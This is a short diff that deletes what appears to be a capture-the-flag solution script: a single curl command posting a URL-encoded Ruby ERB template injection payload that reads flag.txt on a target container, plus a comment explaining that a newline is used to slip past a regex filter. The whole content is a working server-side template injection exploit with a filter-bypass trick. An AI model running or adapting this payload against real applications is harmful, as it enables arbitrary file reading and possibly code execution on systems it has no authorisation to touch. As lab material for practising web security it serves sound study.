@@ -1,3 +1,0 @@
-curl -d 'neon=a
-%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' {Container_IP}
-#use newlineto trick the regex filter 
